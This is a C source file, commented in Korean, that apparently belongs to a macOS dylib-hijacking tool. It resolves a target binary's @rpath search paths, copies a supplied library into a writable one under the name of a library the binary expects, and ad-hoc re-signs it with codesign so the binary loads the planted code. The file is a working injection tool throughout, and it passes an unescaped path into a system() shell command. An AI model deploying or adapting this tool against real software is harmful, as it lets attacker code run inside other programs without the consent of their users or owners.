#include "rpath_injector.h"
#include "dylib_modifier.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <libgen.h>

/**
 * @rpath를 실제 경로로 변환합니다.
 * 
 * @param binary_path 바이너리 경로
 * @param rpath_relative @rpath로 시작하는 경로 (예: @rpath/../Frameworks/libswiftCore.dylib)
 * @param out_resolved 변환된 경로 (동적 할당)
 * @return 성공 시 true
 */
static bool resolve_rpath(const char *binary_path, const char *rpath_relative, char **out_resolved) {
    // 바이너리의 디렉토리 위치
    char *binary_copy = strdup(binary_path);
    char *binary_dir = dirname(binary_copy);
    
    // @rpath/... 형식 처리
    const char *rpath_path = rpath_relative;
    if (strstr(rpath_path, "@rpath") == rpath_path) {
        rpath_path += 6; // "@rpath" 길이
        if (*rpath_path == '/') rpath_path++;
    }
    
    // 상대 경로 처리
    char resolved[4096];
    snprintf(resolved, sizeof(resolved), "%s/%s", binary_dir, rpath_path);
    
    // 경로 정규화 (../.. 처리)
    char *result = realpath(resolved, NULL);
    if (result) {
        *out_resolved = result;
        free(binary_copy);
        return true;
    }
    
    free(binary_copy);
    return false;
}

/**
 * 주입 가능한 위치 찾기
 * @param selected_index 사용자가 선택한 취약점의 인덱스 (0부터 시작)
 */
bool analyze_rpath_vulnerability(
    const char *binary_path,
    char **rpath_vulns,
    size_t rpath_count,
    size_t selected_index,
    char **out_injection_path) {
    
    if (rpath_count == 0) {
        fprintf(stderr, "[ERROR] RPATH 취약 경로가 없습니다.\n");
        return false;
    }
    
    if (selected_index >= rpath_count) {
        fprintf(stderr, "[ERROR] 잘못된 RPATH 인덱스: %zu (최대: %zu)\n", selected_index, rpath_count - 1);
        return false;
    }
    
    printf("\n[*] RPATH 취약점 분석...\n");
    printf("   발견된 취약 경로: %zu개\n", rpath_count);
    
    for (size_t i = 0; i < rpath_count; i++) {
        printf("   [%zu] %s\n", i + 1, rpath_vulns[i]);
    }
    
    // 선택된 경로 사용
    const char *selected_vuln = rpath_vulns[selected_index];
    
    // 경로가 절대경로인지 상대경로인지 확인
    if (selected_vuln[0] == '@') {
        // @rpath 형식 처리
        char *resolved = NULL;
        if (!resolve_rpath(binary_path, selected_vuln, &resolved)) {
            fprintf(stderr, "[ERROR] @rpath 변환 실패: %s\n", selected_vuln);
            return false;
        }
        
        *out_injection_path = resolved;
        printf("   → [선택됨] %s\n", resolved);
        return true;
    } else {
        // 절대경로
        *out_injection_path = strdup(selected_vuln);
        printf("   → [선택됨] %s\n", selected_vuln);
        return true;
    }
}

/**
 * @rpath를 통한 dylib 주입
 * 
 * 동작 원리 (매우 간단):
 * 1. 취약한 @rpath 경로를 파악
 * 2. 그 디렉토리에 우리 dylib을 원본 dylib 이름으로 복사
 * 3. 바이너리가 @rpath/~.dylib을 찾을 때, 자동으로 우리 dylib 발견 및 로드됨
 * 
 * @rpath 메커니즘이 경로 해석을 자동으로 처리하므로
 * install_name 설정이나 의존성 패치는 불필요합니다.
 */
bool inject_via_rpath(
    const char *source_dylib,
    const char *binary_path,
    char **rpath_vulns,
    size_t rpath_count,
    const char *original_dylib_name,
    size_t selected_rpath_index) {
    
    char *injection_path = NULL;
    if (!analyze_rpath_vulnerability(binary_path, rpath_vulns, rpath_count, selected_rpath_index, &injection_path)) {
        return false;
    }
    
    printf("\n[*] RPATH 주입 시작...\n");
    printf("   취약 경로: %s\n", injection_path);
    
    // injection_path는 @rpath로 해석된 절대 경로
    // 이 디렉토리에 우리 dylib을 복사하면 됨
    char *path_copy = strdup(injection_path);
    char *dir = dirname(path_copy);
    
    // 최종 dylib 경로 (원본 이름으로)
    char final_dylib_path[1024];
    snprintf(final_dylib_path, sizeof(final_dylib_path), "%s/%s", dir, original_dylib_name);
    
    printf("   주입 위치: %s\n", final_dylib_path);
    
    // 1단계: dylib 복사
    printf("\n[*] 단계 1: dylib 복사\n");
    if (!copy_dylib(source_dylib, final_dylib_path)) {
        free(injection_path);
        free(path_copy);
        return false;
    }
    
    printf("\n[*] 단계 2: 코드 서명\n");
    char codesign_cmd[1024];
    snprintf(codesign_cmd, sizeof(codesign_cmd), 
             "codesign -f -s - '%s' 2>&1", final_dylib_path);
    
    if (system(codesign_cmd) == 0) {
        printf("[✓] 코드 서명 완료\n");
    } else {
        printf("[WARNING] 코드 서명 실패 (SIP 보호일 수 있음)\n");
    }
    
    printf("\n[✓] RPATH 주입 완료!\n");
    printf("   바이너리가 @rpath/%s을 로드할 때 자동으로 우리 dylib을 발견합니다\n", 
           original_dylib_name);
    
    free(injection_path);
    free(path_copy);
    return true;
}